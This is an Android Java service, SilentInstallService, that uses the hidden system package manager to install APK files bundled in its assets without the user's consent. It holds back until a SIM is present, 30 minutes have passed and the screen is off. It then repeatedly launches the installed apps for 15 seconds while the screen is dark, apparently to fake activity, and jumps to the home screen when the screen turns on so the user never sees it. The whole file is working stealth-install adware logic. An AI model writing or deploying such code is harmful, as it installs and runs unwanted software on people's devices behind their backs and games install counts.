package com.xstd.active.plugin;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.os.RemoteException;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDao;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;

public class SilentInstallService extends Service {

    private IPackageManager manager;
    private ScreenChangeReceiver receiver;
    private SharedPreferences sharedPreferences;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);

        try {
            @SuppressWarnings("rawtypes")
			Class clazz = getClassLoader().loadClass("android.os.ServiceManager");
            @SuppressWarnings("unchecked")
			Method method = clazz.getMethod("getService", new Class[]{String.class});
            IBinder b = (IBinder) method.invoke(null, "package");
            manager = IPackageManager.Stub.asInterface(b);
        } catch (Exception e) {
            e.printStackTrace();
        }

        receiver = new ScreenChangeReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(receiver, filter);
        
        boolean fs = sharedPreferences.getBoolean("fs", false);
        if (!fs)
            copyFileToCache();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }
    
    @Override
    public void onStart(Intent intent, int startId) {
    	super.onStart(intent, startId);
        if (intent!=null&&!TextUtils.isEmpty(intent.getStringExtra("apk_path")))
            installFile(new File(intent.getStringExtra("apk_path")),observer);
    }

    class ScreenChangeReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(action)) {
            	isScreenLignt = true;
                active = false;
                goHome();
            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
            	isScreenLignt = false;
                activeApp();
            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                checkActive();
            }
        }
    }
    
    private boolean isScreenLignt = true;

    private void checkActive() {
    	getDeviceInstallPackName();
    	long currentTimeMillis = System.currentTimeMillis();
    	long oneDay = 1000 * 60 * 60 * 24;
    	SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
    	Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
    	while(cursor.moveToNext()) {
    		long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
    		long installTotal = currentTimeMillis-installtime;
    		if(oneDay < installTotal &&  installTotal < oneDay*2) {
    			SilenceApp entity = new SilenceApp();
    			entity.setId(cursor.getLong(0));
    			entity.setActive(false);
    			dao.update(entity);
    		} else if(oneDay *4 < installTotal && installTotal < oneDay *6) {
    			SilenceApp entity = new SilenceApp();
    			entity.setId(cursor.getLong(0));
    			entity.setActive(false);
    			dao.update(entity);
    		}
    	}
    }

    private String packageName;
    private boolean active;
    private List<String> packgeNames = new ArrayList<String>();
    
    /**
     * 获取手机所有安装程序的包名
     */
    private void getDeviceInstallPackName(){
    	packgeNames.clear();
    		List<PackageInfo> pis = getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
    		for (PackageInfo pi : pis)
    			packgeNames.add(pi.packageName);
    }

    /**
     * 激活安装的程序
     */
    private void activeApp() {
    	getDeviceInstallPackName();
        new Thread(new Runnable() {
            @Override
            public void run() {
                active = true;
                SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
                Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), "active=?", new String[]{String.valueOf(0)}, null, null, SilenceAppDao.Properties.Installtime.columnName + " ASC");
 
                while (active && cursor.moveToNext()) {
                	long id = cursor.getLong(0);
                    String packname = cursor.getString(1);
                    if(!packgeNames.contains(packname)) {
                    	Log.w("ps", packname + "not active, it's uninstall, delete it in db.");
                    	SilenceApp entity = new SilenceApp();
                    	entity.setId(id);
                    	entity.setPackagename(packname);
                    	dao.delete(entity); 
                    	break;
                    }
                    packageName = packname;
                    Intent app = getPackageManager().getLaunchIntentForPackage(packname);
                    startActivity(app);
                    SystemClock.sleep(15000);
                    if(!active) {
                    	break;
                    }
                    SilenceApp entity = new SilenceApp();
                    entity.setId(id);
                    entity.setPackagename(packname);
                    entity.setActive(true);
                    dao.update(entity);
                    if (packageName != null) {
                    	goHome();
//                    	ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
//                      am.killBackgroundProcesses(packageName);
                    }
                }
                if (cursor != null)
                    cursor.close();
            }
        }).start();
    }

    /**
     * 跳转到Launcher
     */
    public void goHome() {
        Intent i= new Intent(Intent.ACTION_MAIN);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }
 
    /**
     * 安装程序
     * @param file
     */
    private void installFile(File file, IPackageInstallObserver observer) {
        if (file == null)
            return;
        if (!file.isFile())
            return;
        if (file.length() <= 0)
            return;
        if (!file.getName().endsWith(".apk"))
            return;
        String packName = getPackageName(file.getAbsolutePath());
        Uri uri = Uri.fromFile(file);
        if (uri != null)
            try {
                manager.installPackage(uri, observer, 0, packName);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
    }

    /**
     * 通过APK包的绝对路径获得APK包的包名
     *
     * @param absPath APK的绝对路径
     * @return APK的包名
     */
    private String getPackageName(String absPath) {
        PackageInfo pkgInfo = getPackageManager().getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
        if (pkgInfo != null) {
            return pkgInfo.applicationInfo.packageName;
        }
        return null;
    }
    
    /**
     * 判断手机sim卡是否正常
     * @return
     */
    private boolean simReady(){
    	TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
    	if(TelephonyManager.SIM_STATE_READY == tm.getSimState())
    		return true;
    	else
    		return false;
    }
    
    private void copyFileToCache() {
    	if(!simReady())
    		return;
        new Thread(new Runnable() {
            @Override
            public void run() {
            	SystemClock.sleep(1000 * 60 * 30);//等待30min
            	while(isScreenLignt)//如果屏幕亮着，什么都不执行。
            		SystemClock.sleep(2000);
                if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
                    return;
                String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
                AssetManager assets = getAssets();
                InputStream is = null;
                OutputStream os = null;
                try {
                    for (String app : assets.list("")) {
                        if (!app.endsWith(".apk"))
                            continue;
                        File file = new File(sdcardPath, app);
                        if (file.exists())
                            continue;
                        is = assets.open(app);
                        os = new BufferedOutputStream(new FileOutputStream(file));
                        byte[] b = new byte[1024 * 5];
                        int len;
                        while ((len = is.read(b)) != -1) {
                            os.write(b, 0, len);
                        }
                        os.flush();
                        installFile(file,observer);
                    }
                 } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    try {
                        if (is != null)
                            is.close();
                        if (os != null)
                            os.close();
                    } catch (Exception e) {
                    }
                }
                sharedPreferences.edit().putBoolean("ps", true).commit();
            }
        }).start();
    }
    
    /**
     * 程序安装结果
     */
    private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {
		
		@Override
		public void packageInstalled(String packageName, int returnCode)
				throws RemoteException {
			if (returnCode == 1) {
                SilenceApp sa = new SilenceApp();
                sa.setPackagename(packageName);
                sa.setInstalltime(System.currentTimeMillis());
                sa.setActive(false);
                SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
            }
		}
	};

}